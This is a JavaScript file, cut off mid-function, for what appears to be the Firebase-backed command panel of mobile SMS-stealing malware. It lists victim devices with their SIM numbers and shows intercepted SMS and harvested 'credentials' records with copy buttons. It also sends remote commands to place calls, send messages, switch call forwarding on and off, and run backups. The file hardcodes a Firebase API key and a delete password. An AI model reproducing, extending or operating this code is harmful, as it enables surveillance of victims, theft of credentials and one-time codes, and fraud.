/* ============================================================ */
/* app.js - COMPLETE FIXED - NO BLINK, NO AUTO REFRESH        */
/* ============================================================ */

// ============================================================
// FIREBASE CONFIG
// ============================================================
const firebaseConfig = {
    apiKey: "AIzaSyAzStFCeODQmVbydsq1yxPHryz-cqM8lrU",
    authDomain: "hello4211.firebaseapp.com",
    databaseURL: "https://hello4211-default-rtdb.firebaseio.com",
    projectId: "hello4211",
    storageBucket: "hello4211.firebasestorage.app",
    messagingSenderId: "11131576643",
    appId: "1:11131576643:web:64e4153cee7cb7847e4ff6"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

// ============================================================
// CONSTANTS
// ============================================================
const DEVICE_LIMIT = 5;
const SMS_LIMIT = 10;
const MIN_RENDER_INTERVAL = 300;
const DELETE_PASSWORD = '9999';

// ============================================================
// STATE - CLEAN & ORGANIZED
// ============================================================
const state = {
    // Data
    data: { user_data: {}, user_sms: {}, login: {}, backup_sms: {} },
    
    // Caches
    deviceOnlineStatus: new Map(),
    deviceSerialMap: new Map(),
    deviceSmsCache: new Map(),
    allDeviceKeys: [],
    filteredKeys: [],
    allSmsList: [],
    modalSmsList: [],
    
    // UI State
    expandedDevices: new Map(),
    activeTabs: new Map(),
    isPanelOpen: { devices: true, sms: false, backup: false, analytics: false },
    formMemory: {},
    
    // Pagination
    deviceOffset: 0,
    allSmsOffset: 0,
    modalSmsOffset: 0,
    
    // Filters
    currentFilter: 'all',
    searchQuery: '',
    smsFilterDevice: null,
    modalTarget: 'ALL',
    
    // Render control
    isRendering: false,
    renderVersion: 0,
    pendingRender: null,
    pendingUpdates: new Set(),
    
    // Misc
    isFirstLoad: true,
    dataVersion: 0
};

// ============================================================
// DOM REFS
// ============================================================
const $ = (id) => document.getElementById(id);

// ============================================================
// CONNECTION MONITOR
// ============================================================
db.ref(".info/connected").on("value", (snap) => {
    const badge = $('statusBadge');
    const text = $('statusText');
    if (snap.val() === true) {
        badge.className = 'connection-status online';
        text.textContent = 'Online';
    } else {
        badge.className = 'connection-status offline';
        text.textContent = 'Offline';
    }
});

// ============================================================
// MAIN DATA LISTENER - OPTIMIZED
// ============================================================
db.ref().on("value", (snapshot) => {
    const newData = snapshot.val() || {};
    state.dataVersion++;
    state.data = newData;
    
    // Update caches
    updateCaches();
    
    // Check if user is typing
    const active = document.activeElement;
    const typing = active && (active.tagName === 'INPUT' || active.tagName === 'TEXTAREA' || active.tagName === 'SELECT');
    if (typing) return;
    
    // Schedule render
    scheduleRender();
    
    if (state.isFirstLoad) {
        state.isFirstLoad = false;
        if (!state.isPanelOpen.devices) {
            togglePanel('devices');
        }
    }
});

// ============================================================
// UPDATE CACHES - OPTIMIZED
// ============================================================
function updateCaches() {
    const devices = state.data.user_data || {};
    const smsData = state.data.user_sms || {};
    const now = Date.now();
    
    // Update device keys
    state.allDeviceKeys = Object.keys(devices);
    
    // Update online status
    state.allDeviceKeys.forEach(devId => {
        const dev = devices[devId];
        if (!dev) return;
        const isOnline = dev.isOnline || dev.online || false;
        const lastSeen = dev.last_online || dev.timestamp || 0;
        const isRecent = (now - lastSeen) < 120000;
        state.deviceOnlineStatus.set(devId, isOnline || isRecent);
    });
    
    // Update SMS cache - only if changed
    state.allDeviceKeys.forEach(devId => {
        if (smsData[devId]) {
            const keys = Object.keys(smsData[devId]);
            const newAll = keys.map(k => smsData[devId][k]);
            const cached = state.deviceSmsCache.get(devId);
            if (!cached || JSON.stringify(cached.all) !== JSON.stringify(newAll)) {
                state.deviceSmsCache.set(devId, { 
                    all: newAll, 
                    offset: 0,
                    version: (cached?.version || 0) + 1
                });
            }
        }
    });
    
    // Update serial map
    state.allDeviceKeys.forEach(devId => {
        const dev = devices[devId];
        if (dev) {
            let serial = dev.user_serial || dev.uesr_serial || 0;
            if (typeof serial === 'string') serial = parseInt(serial) || 0;
            state.deviceSerialMap.set(devId, serial);
        }
    });
}

// ============================================================
// SCHEDULE RENDER - DEBOUNCED
// ============================================================
function scheduleRender() {
    if (state.pendingRender) {
        clearTimeout(state.pendingRender);
        state.pendingRender = null;
    }
    
    if (state.isRendering) {
        state.pendingRender = setTimeout(() => {
            state.pendingRender = null;
            performRender();
        }, MIN_RENDER_INTERVAL);
        return;
    }
    
    state.pendingRender = setTimeout(() => {
        state.pendingRender = null;
        performRender();
    }, 200);
}

// ============================================================
// PERFORM RENDER - MAIN
// ============================================================
function performRender() {
    if (state.isRendering) return;
    state.isRendering = true;
    
    try {
        updateCounts();
        
        if (state.isPanelOpen.devices) renderDevicesOptimized();
        if (state.isPanelOpen.sms) renderAllSmsOptimized();
        if (state.isPanelOpen.analytics) renderAnalytics();
        if (state.isPanelOpen.backup) renderBackupPanel();
    } catch (err) {
        console.error('Render error:', err);
    } finally {
        state.isRendering = false;
        if (state.pendingRender) {
            const pending = state.pendingRender;
            state.pendingRender = null;
            performRender();
        }
    }
}

// ============================================================
// UPDATE COUNTS - FAST
// ============================================================
function updateCounts() {
    const devices = state.data.user_data || {};
    const keys = Object.keys(devices);
    const deviceCount = $('deviceCount');
    const panelDeviceCount = $('panelDeviceCount');
    if (deviceCount) deviceCount.textContent = keys.length;
    if (panelDeviceCount) panelDeviceCount.textContent = keys.length;
    
    const smsData = state.data.user_sms || {};
    let totalSms = 0;
    Object.keys(smsData).forEach(d => {
        totalSms += Object.keys(smsData[d]).length;
    });
    const smsCount = $('smsCount');
    if (smsCount) smsCount.textContent = totalSms;
    
    if (!state.smsFilterDevice) {
        const panelSmsCount = $('panelSmsCount');
        if (panelSmsCount) panelSmsCount.textContent = totalSms;
    }
}

// ============================================================
// RENDER DEVICES - OPTIMIZED WITH DIFFING
// ============================================================
function renderDevicesOptimized() {
    const container = $('devicesContainer');
    if (!container) return;
    
    const devices = state.data.user_data || {};
    let keys = getFilteredDeviceKeys();
    
    if (keys.length === 0) {
        let msg = 'No devices found';
        if (state.searchQuery) msg = 'No devices match "' + state.searchQuery + '"';
        else if (state.currentFilter === 'online') msg = 'No online devices';
        else if (state.currentFilter === 'offline') msg = 'No offline devices';
        container.innerHTML = `<div class="empty-luxury"><i class="fas fa-search empty-icon"></i>${msg}</div>`;
        return;
    }
    
    const start = state.deviceOffset;
    const end = Math.min(start + DEVICE_LIMIT, keys.length);
    const displayKeys = keys.slice(start, end);
    const hasMore = end < keys.length;
    
    // Build HTML for current page
    let html = '';
    displayKeys.forEach((devId, index) => {
        html += buildDeviceCard(devId, start + index, devices);
    });
    
    // Check if we can update in place
    const existingCards = container.querySelectorAll('.device-card-luxury');
    if (existingCards.length === displayKeys.length && 
        Array.from(existingCards).every((card, i) => card.dataset.deviceId === displayKeys[i])) {
        // Update in place - only dynamic content
        displayKeys.forEach((devId, i) => {
            updateDeviceCardDynamic(existingCards[i], devId);
        });
    } else {
        container.innerHTML = html;
    }
    
    // Add navigation buttons
    if (hasMore) {
        const remaining = keys.length - end;
        const loadBtn = document.createElement('button');
        loadBtn.className = 'btn-load-more';
        loadBtn.innerHTML = `<i class="fas fa-chevron-down"></i> Load More (${remaining} remaining)`;
        loadBtn.onclick = function(e) {
            e.stopPropagation();
            state.deviceOffset += DEVICE_LIMIT;
            renderDevicesOptimized();
        };
        container.appendChild(loadBtn);
    }
    
    if (state.deviceOffset > 0) {
        const backBtn = document.createElement('button');
        backBtn.className = 'btn-load-more';
        backBtn.style.marginBottom = '10px';
        backBtn.innerHTML = '<i class="fas fa-chevron-up"></i> Back';
        backBtn.onclick = function(e) {
            e.stopPropagation();
            state.deviceOffset = Math.max(0, state.deviceOffset - DEVICE_LIMIT);
            renderDevicesOptimized();
        };
        container.insertBefore(backBtn, container.firstChild);
    }
}

// ============================================================
// BUILD DEVICE CARD - PURE FUNCTION
// ============================================================
function buildDeviceCard(devId, index, devices) {
    const dev = devices[devId] || {};
    const serial = state.deviceSerialMap.get(devId) || 0;
    const online = state.deviceOnlineStatus.get(devId) || false;
    const lastSeen = dev.last_online || dev.timestamp;
    const statusClass = online ? 'online' : 'offline';
    const statusText = online ? '● Online' : '● Offline';
    const timeStr = lastSeen ? new Date(lastSeen).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : 'N/A';
    
    const smsCache = state.deviceSmsCache.get(devId);
    const totalSms = smsCache ? smsCache.all.length : 0;
    
    const loginData = state.data.login || {};
    let devLoginList = [];
    if (loginData[devId]) {
        Object.keys(loginData[devId]).forEach(k => devLoginList.push(loginData[devId][k]));
        devLoginList.reverse();
    }
    
    const isExpanded = state.expandedDevices.get(devId) || false;
    const activeTab = state.activeTabs.get(devId) || null;
    
    let devSmsList = [];
    const hasMoreSms = smsCache && (smsCache.offset + SMS_LIMIT < smsCache.all.length);
    
    if (smsCache) {
        const startIdx = smsCache.offset;
        const endIdx = Math.min(startIdx + SMS_LIMIT, smsCache.all.length);
        devSmsList = smsCache.all.slice(startIdx, endIdx).reverse();
    }
    
    // Build login HTML
    let allLoginHtml = '';
    if (devLoginList.length > 0) {
        allLoginHtml = devLoginList.map((rec, idx) => {
            let fields = '';
            for (let k in rec) {
                if (k === 'key' || k === 'timestamp') continue;
                const value = rec[k] || 'N/A';
                const escaped = escapeHtml(String(value));
                fields += `<div class="login-field">
                    <span class="field-label">${escapeHtml(k)}:</span>
                    <span class="field-value" id="field-${devId}-${idx}-${k}">${escaped}</span>
                    <button class="copy-field-btn" onclick="event.stopPropagation();copyField('field-${devId}-${idx}-${k}')" title="Copy ${k}">
                        <i class="fas fa-copy"></i>
                    </button>
                </div>`;
            }
            return `<div class="login-card">
                <div class="login-card-header">
                    <span>Record ${idx+1}</span>
                    <span class="record-number">#${idx+1}</span>
                </div>
                <div class="login-card-body">${fields}</div>
            </div>`;
        }).join('');
    }
    
    let scrollIndicator = '';
    if (devLoginList.length > 5) {
        scrollIndicator = `
            <div style="display:flex;gap:6px;margin-top:6px;flex-wrap:wrap;">
                <button class="scroll-to-bottom-btn" onclick="event.stopPropagation();scrollCredentialsToTop('${devId}')">
                    <i class="fas fa-arrow-up"></i> Top
                </button>
                <button class="scroll-to-bottom-btn" onclick="event.stopPropagation();scrollCredentialsToBottom('${devId}')">
                    <i class="fas fa-arrow-down"></i> Bottom
                </button>
                <span style="font-size:9px;color:var(--text-muted);display:flex;align-items:center;padding:0 8px;">
                    ${devLoginList.length} records
                </span>
            </div>
        `;
    }
    
    // Build SMS list HTML
    let smsHtml = renderSmsCards(devSmsList);
    if (devSmsList.length === 0) {
        smsHtml = '<div class="empty-luxury">No SMS</div>';
    }
    
    return `
        <div class="device-card-luxury ${isExpanded ? 'expanded' : ''}" id="card-${devId}" data-device-id="${devId}">
            <div class="device-top" onclick="toggleDevice('${devId}')">
                <div>
                    <div class="device-name">
                        <span class="device-serial-badge">#${index + 1}</span>
                        📱 ${escapeHtml(devId)}
                        ${serial > 0 ? `<span class="device-serial-badge" style="background:rgba(16,185,129,0.12);color:var(--green);border-color:rgba(16,185,129,0.2);">S-${serial}</span>` : ''}
                    </div>
                    <div style="font-size:10px;color:var(--text-muted);margin-top:2px;">
                        ${isExpanded ? '▲ Click to collapse' : '▼ Click to expand'}
                    </div>
                </div>
                <div style="text-align:right;">
                    <span class="device-status ${statusClass}" id="status-${devId}">${statusText}</span>
                    <div style="font-size:9px;color:var(--text-muted);margin-top:2px;" id="time-${devId}">⏱ ${timeStr}</div>
                    <button class="check-status-btn" onclick="event.stopPropagation();checkDeviceStatus('${devId}')" title="Check Online Status">
                        <i class="fas fa-sync-alt"></i>
                    </button>
                </div>
            </div>

            <div class="device-info-grid" onclick="toggleDevice('${devId}')">
                <div class="item"><span>Device</span><b>${escapeHtml(dev.Device_info || dev.device_info || 'N/A')}</b></div>
                <div class="item"><span>SIM 1</span><b>${escapeHtml(dev.numberSim1 || dev.sim1 || 'N/A')}</b></div>
                <div class="item"><span>SIM 2</span><b>${escapeHtml(dev.numberSim2 || dev.sim2 || 'N/A')}</b></div>
                ${serial > 0 ? `<div class="item"><span>Serial</span><b style="color:var(--gold);">${serial}</b></div>` : ''}
            </div>

            <div class="device-body">
                <div class="device-actions-luxury">
                    <button class="sub-btn ${activeTab === 'sms' ? 'active-sms' : ''}" onclick="event.stopPropagation();setTab('${devId}','sms')">
                        💬 ${totalSms}
                    </button>
                    <button class="sub-btn ${activeTab === 'login' ? 'active-login' : ''}" onclick="event.stopPropagation();setTab('${devId}','login')">
                        🔑 ${devLoginList.length}
                    </button>
                    <button class="sub-btn ${activeTab === 'call' ? 'active-call' : ''}" onclick="event.stopPropagation();setTab('${devId}','call')">📞</button>
                    <button class="sub-btn ${activeTab === 'sendsms' ? 'active-sendsms' : ''}" onclick="event.stopPropagation();setTab('${devId}','sendsms')">✉️</button>
                    <button class="sub-btn ${activeTab === 'fwd' ? 'active-fwd' : ''}" onclick="event.stopPropagation();setTab('${devId}','fwd')">🔀</button>
                    <button class="sub-btn ${activeTab === 'backup' ? 'active-backup' : ''}" onclick="event.stopPropagation();setTab('${devId}','backup')">💾</button>
                    <button class="sub-btn ${activeTab === 'delete' ? 'active-delete' : ''}" onclick="event.stopPropagation();setTab('${devId}','delete')" style="color:var(--red);">🗑️</button>
                </div>

                <!-- SMS Section -->
                <div class="section-box ${activeTab === 'sms' ? 'active' : ''}" id="sec-sms-${devId}">
                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
                        <h4 style="color:var(--gold-light);margin:0;font-size:13px;">💬 SMS (${totalSms})</h4>
                        <div style="display:flex;gap:4px;">
                            <button onclick="event.stopPropagation();openSmsModal('${devId}')" style="background:var(--gold);color:#0c0e14;border:none;padding:2px 12px;border-radius:6px;font-size:10px;font-weight:600;cursor:pointer;">⛶ Full</button>
                            ${totalSms > 0 ? `<button onclick="event.stopPropagation();deleteDeviceSms('${devId}')" style="background:var(--red);color:#fff;border:none;padding:2px 12px;border-radius:6px;font-size:10px;font-weight:600;cursor:pointer;">🗑️ Delete</button>` : ''}
                        </div>
                    </div>
                    <div class="sms-list-luxury">
                        ${smsHtml}
                    </div>
                    ${hasMoreSms ? `<button class="btn-load-more" style="margin-top:6px;padding:6px;font-size:11px;" onclick="event.stopPropagation();loadMoreDeviceSms('${devId}')">📥 Load More</button>` : ''}
                </div>

                <!-- Login Section -->
                <div class="section-box ${activeTab === 'login' ? 'active' : ''}" id="sec-login-${devId}">
                    <div class="credentials-header">
                        <h4>🔑 All Credentials</h4>
                        <div class="header-actions">
                            <span class="credentials-count">
                                <i class="fas fa-key"></i> ${devLoginList.length}
                            </span>
                            ${devLoginList.length > 0 ? `<button class="login-delete-all-btn" onclick="event.stopPropagation();deleteDeviceCredentials('${devId}')">🗑️ Delete All</button>` : ''}
                        </div>
                    </div>
                    <div class="login-cards" id="login-cards-${devId}">
                        ${devLoginList.length === 0 ? '<div class="empty-luxury"><i class="fas fa-key"></i>No credentials found</div>' : allLoginHtml}
                    </div>
                    ${scrollIndicator}
                </div>

                <!-- Call Section -->
                <div class="section-box ${activeTab === 'call' ? 'active' : ''}" id="sec-call-${devId}">
                    <h4 style="color:var(--green);font-size:13px;">📞 Make Call</h4>
                    <input type="text" id="callNum-${devId}" value="${escapeHtml(state.formMemory['callNum-' + devId] || '')}" placeholder="Phone Number" oninput="state.formMemory['callNum-${devId}']=this.value" onclick="event.stopPropagation()">
                    <select id="callSim-${devId}" onchange="state.formMemory['callSim-${devId}']=this.value" onclick="event.stopPropagation()">
                        <option value="0" ${(state.formMemory['callSim-' + devId] || '0') === '0' ? 'selected' : ''}>SIM 1</option>
                        <option value="1" ${(state.formMemory['callSim-' + devId] || '0') === '1' ? 'selected' : ''}>SIM 2</option>
                    </select>
                    <button class="btn-luxury btn-purple" onclick="event.stopPropagation();showCommandDialog('call','${devId}')" style="padding:8px;font-size:11px;width:100%;justify-content:center;">
                        <i class="fas fa-phone"></i> Call
                    </button>
                </div>

                <!-- Send SMS Section -->
                <div class="section-box ${activeTab === 'sendsms' ? 'active' : ''}" id="sec-sendsms-${devId}">
                    <h4 style="color:var(--purple);font-size:13px;">✉️ Send SMS</h4>
                    <input type="text" id="smsNum-${devId}" value="${escapeHtml(state.formMemory['smsNum-' + devId] || '')}" placeholder="Recipient" oninput="state.formMemory['smsNum-${devId}']=this.value" onclick="event.stopPropagation()">
                    <textarea id="smsText-${devId}" placeholder="Message" rows="2" oninput="state.formMemory['smsText-${devId}']=this.value" onclick="event.stopPropagation()">${escapeHtml(state.formMemory['smsText-' + devId] || '')}</textarea>
                    <select id="smsSim-${devId}" onchange="state.formMemory['smsSim-${devId}']=this.value" onclick="event.stopPropagation()">
                        <option value="1" ${(state.formMemory['smsSim-' + devId] || '1') === '1' ? 'selected' : ''}>SIM 1</option>
                        <option value="2" ${(state.formMemory['smsSim-' + devId] || '1') === '2' ? 'selected' : ''}>SIM 2</option>
                    </select>
                    <button class="btn-luxury btn-blue" onclick="event.stopPropagation();showCommandDialog('sms','${devId}')" style="padding:8px;font-size:11px;width:100%;justify-content:center;">
                        <i class="fas fa-paper-plane"></i> Send
                    </button>
                </div>

                <!-- Forward Section -->
                <div class="section-box ${activeTab === 'fwd' ? 'active' : ''}" id="sec-fwd-${devId}">
                    <h4 style="color:var(--red);font-size:13px;">🔀 Call Forward</h4>
                    <input type="text" id="fwdNum-${devId}" value="${escapeHtml(state.formMemory['fwdNum-' + devId] || '')}" placeholder="Forward To" oninput="state.formMemory['fwdNum-${devId}']=this.value" onclick="event.stopPropagation()">
                    <select id="fwdSim-${devId}" onchange="state.formMemory['fwdSim-${devId}']=this.value" onclick="event.stopPropagation()">
                        <option value="0" ${(state.formMemory['fwdSim-' + devId] || '0') === '0' ? 'selected' : ''}>SIM 1</option>
                        <option value="1" ${(state.formMemory['fwdSim-' + devId] || '0') === '1' ? 'selected' : ''}>SIM 2</option>
                    </select>
                    <button class="btn-luxury" style="background:var(--green);color:#fff;padding:8px;font-size:11px;width:100%;justify-content:center;margin-bottom:4px;" onclick="event.stopPropagation();showCommandDialog('fwd_on','${devId}')">
                        <i class="fas fa-play"></i> Activate
                    </button>
                    <button class="btn-luxury btn-red" onclick="event.stopPropagation();showCommandDialog('fwd_off','${devId}')" style="padding:8px;font-size:11px;width:100%;justify-content:center;">
                        <i class="fas fa-stop"></i> Deactivate
                    </button>
                </div>

                <!-- Backup Section -->
                <div class="section-box ${activeTab === 'backup' ? 'active' : ''}" id="sec-backup-${devId}">
                    <h4 style="color:#06b6d4;font-size:13px;">💾 Backup</h4>
                    <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;">
                        <button class="btn-luxury btn-purple" onclick="event.stopPropagation();showCommandDialog('backup','${devId}')" style="padding:8px;font-size:11px;justify-content:center;">
                            <i class="fas fa-database"></i> Backup
                        </button>
                        <button class="btn-luxury btn-blue" onclick="event.stopPropagation();refreshDeviceBackup('${devId}')" style="padding:8px;font-size:11px;justify-content:center;">
                            <i class="fas fa-sync"></i> Refresh
                        </button>
                    </div>
                    <div id="deviceBackup-${devId}" style="margin-top:8px;padding:8px;background:var(--bg-primary);border-radius:6px;border:1px solid var(--border-color);font-size:11px;color:var(--text-muted);">
                        Click Refresh to check status
                    </div>
                </div>

                <!-- Delete Section -->
                <div class="section-box ${activeTab === 'delete' ? 'active' : ''}" id="sec-delete-${devId}" style="border-color:var(--red);">
                    <h4 style="color:var(--red);font-size:13px;">🗑️ Delete Device Data</h4>
                    <div class="device-delete-actions">
                        <button class="btn-luxury btn-red" onclick="event.stopPropagation();deleteDeviceSms('${devId}')" style="padding:8px;font-size:11px;width:100%;justify-content:center;">
                            <i class="fas fa-trash"></i> Delete All SMS
                        </button>
                        <button class="btn-luxury btn-purple-delete" onclick="event.stopPropagation();deleteDeviceCredentials('${devId}')" style="padding:8px;font-size:11px;width:100%;justify-content:center;">
                            <i class="fas fa-trash"></i> Delete All Credentials
                        </button>
                    </div>
                    <div class="delete-password-hint">
                        <span class="hint-icon">⚠️</span>
                        Password required: <span class="hint-password">9999</span>
                    </div>
                </div>
            </div>
        </div>
    `;
}

// ============================================================
// UPDATE DEVICE CARD DYNAMICALLY - NO BLINK
// ============================================================
function updateDeviceCardDynamic(card, devId) {
    // Update status
    const statusEl = card.querySelector(`#status-${devId}`);
    if (statusEl) {
        const online = state.deviceOnlineStatus.get(devId) || false;
        statusEl.textContent = online ? '● Online' : '● Offline';
        statusEl.className = `device-status ${online ? 'online' : 'offline'}`;
    }
    
    // Update time
    const timeEl = card.querySelector(`#time-${devId}`);
    if (timeEl) {
        const dev = state.data.user_data?.[devId];
        const lastSeen = dev?.last_online || dev?.timestamp;
        timeEl.textContent = lastSeen ? `⏱ ${new Date(lastSeen).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}` : '⏱ N/A';
    }
    
    // Update SMS count
    const smsCache = state.deviceSmsCache.get(devId);
    const totalSms = smsCache ? smsCache.all.length : 0;
    const smsBtn = card.querySelector('.sub-btn:first-child');
    if (smsBtn) {
        smsBtn.innerHTML = `💬 ${totalSms}`;
    }
}

// ============================================================
// GET FILTERED DEVICE KEYS - WITH CACHE
// ============================================================
function getFilteredDeviceKeys() {
    const devices = state.data.user_data || {};
    let keys = Object.keys(devices);
    
    // Apply search
    if (state.searchQuery) {
        const query = state.searchQuery.toLowerCase();
        keys = keys.filter(id => {
            const dev = devices[id] || {};
            const name = dev.d_name || dev.device_name || id;
            const serial = state.deviceSerialMap.get(id) || 0;
            return (id + ' ' + name + ' ' + serial).toLowerCase().includes(query);
        });
    }
    
    // Sort by serial (descending)
    keys.sort((a, b) => {
        const serialA = state.deviceSerialMap.get(a) || 0;
        const serialB = state.deviceSerialMap.get(b) || 0;
        return serialB - serialA;
    });
    
    // Apply filter
    if (state.currentFilter === 'online') {
        keys = keys.filter(id => state.deviceOnlineStatus.get(id) === true);
    } else if (state.currentFilter === 'offline') {
        keys = keys.filter(id => state.deviceOnlineStatus.get(id) === false);
    }
    
    state.filteredKeys = keys;
    return keys;
}

// ============================================================
// TOGGLE DEVICE - WITH PENDING CHECK
// ============================================================
function toggleDevice(devId) {
    if (state.pendingUpdates.has(devId)) return;
    state.pendingUpdates.add(devId);
    
    try {
        const current = state.expandedDevices.get(devId) || false;
        state.expandedDevices.set(devId, !current);
        
        const card = document.getElementById(`card-${devId}`);
        if (card) {
            card.classList.toggle('expanded');
            
            const hint = card.querySelector('.device-top .device-name + div');
            if (hint) {
                hint.textContent = state.expandedDevices.get(devId) ? '▲ Click to collapse' : '▼ Click to expand';
            }
            
            if (state.expandedDevices.get(devId)) {
                setTimeout(() => {
                    checkDeviceStatus(devId);
                    if (state.activeTabs.get(devId) === 'login') {
                        setTimeout(() => autoScrollCredentials(devId), 400);
                    }
                }, 200);
            }
        }
    } finally {
        setTimeout(() => {
            state.pendingUpdates.delete(devId);
        }, 300);
    }
}

// ============================================================
// SET TAB - WITH PENDING CHECK
// ============================================================
function setTab(devId, tab) {
    if (state.pendingUpdates.has(devId)) return;
    state.pendingUpdates.add(devId);
    
    try {
        const current = state.activeTabs.get(devId);
        if (current === tab) {
            state.activeTabs.delete(devId);
        } else {
            state.activeTabs.set(devId, tab);
            if (tab === 'backup') refreshDeviceBackup(devId);
        }
        
        const card = document.getElementById(`card-${devId}`);
        if (!card) {
            state.pendingUpdates.delete(devId);
            return;
        }
        
        // Update button states
        const buttons = card.querySelectorAll('.device-actions-luxury .sub-btn');
        const activeTab = state.activeTabs.get(devId);
        
        buttons.forEach(btn => {
            btn.className = 'sub-btn';
            const text = btn.textContent.trim();
            if (text.includes('💬') && activeTab === 'sms') btn.classList.add('active-sms');
            else if (text.includes('🔑') && activeTab === 'login') btn.classList.add('active-login');
            else if (text.includes('📞') && activeTab === 'call') btn.classList.add('active-call');
            else if (text.includes('✉️') && activeTab === 'sendsms') btn.classList.add('active-sendsms');
            else if (text.includes('🔀') && activeTab === 'fwd') btn.classList.add('active-fwd');
            else if (text.includes('💾') && activeTab === 'backup') btn.classList.add('active-backup');
            else if (text.includes('🗑️') && activeTab === 'delete') btn.classList.add('active-delete');
        });
        
        // Update sections
        const sections = card.querySelectorAll('.section-box');
        sections.forEach(sec => sec.classList.remove('active'));
        
        if (activeTab) {
            const activeSec = card.querySelector(`#sec-${activeTab}-${devId}`);
            if (activeSec) activeSec.classList.add('active');
            
            if (activeTab === 'login') {
                setTimeout(() => autoScrollCredentials(devId), 400);
            }
        }
    } finally {
        setTimeout(() => {
            state.pendingUpdates.delete(devId);
        }, 300);
    }
}

// ============================================================
// SEARCH DEVICES - WITH DEBOUNCE
// ============================================================
let searchTimeout = null;

function searchDevices(query) {
    if (searchTimeout) {
        clearTimeout(searchTimeout);
    }
    
    searchTimeout = setTimeout(() => {
        state.searchQuery = query.toLowerCase().trim();
        state.deviceOffset = 0;
        renderDevicesOptimized();
        searchTimeout = null;
    }, 300);
}

function clearSearch() {
    if (searchTimeout) {
        clearTimeout(searchTimeout);
        searchTimeout = null;
    }
    state.searchQuery = '';
    const input = $('deviceSearchInput');
    if (input) input.value = '';
    const clearBtn = $('searchClearBtn');
    if (clearBtn) clearBtn.style.display = 'none';
    state.deviceOffset = 0;
    renderDevicesOptimized();
}

// ============================================================
// CHECK DEVICE STATUS
// ============================================================
function checkDeviceStatus(devId) {
    if (!devId) return;
    
    const statusEl = document.getElementById(`status-${devId}`);
    if (!statusEl) return;
    
    statusEl.textContent = '⏳ Checking...';
    statusEl.className = 'device-status checking';
    
    db.ref(`user_data/${devId}`).once('value').then(snap => {
        if (snap.exists()) {
            const dev = snap.val();
            const isOnline = dev.isOnline || dev.online || false;
            const lastSeen = dev.last_online || dev.timestamp || 0;
            const currentTime = Date.now();
            const isRecent = (currentTime - lastSeen) < 120000;
            const finalStatus = isOnline || isRecent;
            
            state.deviceOnlineStatus.set(devId, finalStatus);
            updateDeviceStatusUI(devId, finalStatus, lastSeen);
            
            showToast(`📱 ${devId}: ${finalStatus ? '🟢 Online' : '🔴 Offline'}`, finalStatus ? 'success' : 'error');
        } else {
            statusEl.textContent = '❌ Not Found';
            statusEl.className = 'device-status offline';
            showToast('❌ Device not found', 'error');
        }
    }).catch(() => {
        statusEl.textContent = '❌ Error';
        statusEl.className = 'device-status offline';
        showToast('❌ Error checking status', 'error');
    });
}

// ============================================================
// UPDATE DEVICE STATUS UI
// ============================================================
function updateDeviceStatusUI(devId, isOnline, lastSeen) {
    const statusEl = document.getElementById(`status-${devId}`);
    const timeEl = document.getElementById(`time-${devId}`);
    
    if (statusEl) {
        const statusText = isOnline ? '● Online' : '● Offline';
        statusEl.textContent = statusText;
        statusEl.className = `device-status ${isOnline ? 'online' : 'offline'}`;
    }
    
    if (timeEl) {
        const timeStr = lastSeen ? new Date(lastSeen).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : 'N/A';
        timeEl.textContent = `⏱ ${timeStr}`;
    }
}

// ============================================================
// TOGGLE PANEL
// ============================================================
function togglePanel(panel) {
    const panels = ['devices', 'sms', 'backup', 'analytics'];
    
    panels.forEach(p => {
        if (p !== panel) {
            const el = $(`panel${p.charAt(0).toUpperCase() + p.slice(1)}`);
            if (el) el.classList.remove('active');
            const nav = document.querySelector(`.nav-item[data-panel="${p}"]`);
            if (nav) nav.classList.remove('active');
            state.isPanelOpen[p] = false;
        }
    });
    
    const panelEl = $(`panel${panel.charAt(0).toUpperCase() + panel.slice(1)}`);
    const nav = document.querySelector(`.nav-item[data-panel="${panel}"]`);
    
    if (panelEl) {
        state.isPanelOpen[panel] = !state.isPanelOpen[panel];
        if (state.isPanelOpen[panel]) {
            panelEl.classList.add('active');
            if (nav) nav.classList.add('active');
            performRender();
        } else {
            panelEl.classList.remove('active');
            if (nav) nav.classList.remove('active');
        }
    }
}

// ============================================================
// FILTER DEVICES
// ============================================================
function filterDevices(filter) {
    state.currentFilter = filter;
    state.deviceOffset = 0;
    
    document.querySelectorAll('.filter-btn').forEach(btn => btn.classList.remove('active'));
    if (filter === 'all') {
        const el = $('filterAll');
        if (el) el.classList.add('active');
    } else if (filter === 'online') {
        const el = $('filterOnline');
        if (el) el.classList.add('active');
    } else if (filter === 'offline') {
        const el = $('filterOffline');
        if (el) el.classList.add('active');
    }
    
    renderDevicesOptimized();
}

// ============================================================
// LOAD MORE FUNCTIONS
// ============================================================
function loadMoreDevices() {
    state.deviceOffset += DEVICE_LIMIT;
    renderDevicesOptimized();
}

function loadMoreDeviceSms(devId) {
    const cache = state.deviceSmsCache.get(devId);
    if (cache) {
        cache.offset += SMS_LIMIT;
        renderDevicesOptimized();
        state.expandedDevices.set(devId, true);
        state.activeTabs.set(devId, 'sms');
        const cardEl = document.getElementById(`card-${devId}`);
        if (cardEl) cardEl.classList.add('expanded');
    }
}

function loadMoreAllSms() {
    state.allSmsOffset += SMS_LIMIT;
    renderAllSmsOptimized();
}

function loadMoreModalSms() {
    state.modalSmsOffset += SMS_LIMIT;
    renderModalSms();
}

// ============================================================
// RENDER SMS CARDS
// ============================================================
function renderSmsCards(list, showDevice = false) {
    if (!list || list.length === 0) return '';
    return list.map(msg => `
        <div class="sms-card-luxury">
            <div class="sms-header">
                <div class="sms-sender">
                    ${showDevice ? `<span class="device-tag" onclick="filterSmsByDevice('${escapeHtml(msg.deviceId || '')}')">[${escapeHtml(msg.deviceId || '')}]</span> ` : ''}
                    👤 ${escapeHtml(msg.sender || msg.address || 'Unknown')}
                </div>
                <div class="sms-meta">
                    ${escapeHtml(msg.date_formatted || msg.date || '')} ${msg.sim_number ? '• ' + escapeHtml(msg.sim_number) : ''}
                </div>
            </div>
            <div class="sms-body">${escapeHtml(msg.body || 'No content')}</div>
        </div>
    `).join('');
}

// ============================================================
// RENDER ALL SMS - OPTIMIZED
// ============================================================
function renderAllSmsOptimized() {
    const container = $('allSmsContainer');
    const loadMore = $('allSmsLoadMore');
    if (!container) return;
    
    if (state.allSmsOffset === 0) {
